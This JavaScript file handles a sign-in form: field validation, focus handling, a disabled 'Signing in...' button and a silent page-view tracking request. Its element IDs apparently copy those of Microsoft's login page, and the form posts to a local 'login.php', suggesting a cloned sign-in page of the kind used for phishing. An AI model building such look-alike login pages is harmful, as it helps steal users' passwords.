document.addEventListener('DOMContentLoaded', function() {
    // Get form elements
    const form = document.getElementById('i0281');
    const emailInput = document.getElementById('i0116');
    const passwordInput = document.getElementById('i0118');
    const submitButton = document.getElementById('idSIButton9');

    // Focus on email input when page loads
    emailInput.focus();

    // Add event listeners
    emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            passwordInput.focus();
        }
    });

    form.addEventListener('submit', function(e) {
        // Perform basic validation
        if (!emailInput.value.trim()) {
            e.preventDefault();
            emailInput.focus();
            return false;
        }

        if (!passwordInput.value.trim()) {
            e.preventDefault();
            passwordInput.focus();
            return false;
        }

        // Submit form to login.php endpoint
        // No need to prevent default as we want the form to actually submit
        submitButton.value = "Signing in...";
        submitButton.disabled = true;
    });

    // Track login attempts for analytics (sends to our backend)
    function trackLoginAttempt() {
        // Create a tracking fetch request
        fetch('/api/track', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                type: 'login_view',
                timestamp: new Date().toISOString()
            })
        }).catch(err => {
            // Silently fail - don't alert user to tracking
            console.error(err);
        });
    }

    // Track page load
    trackLoginAttempt();
});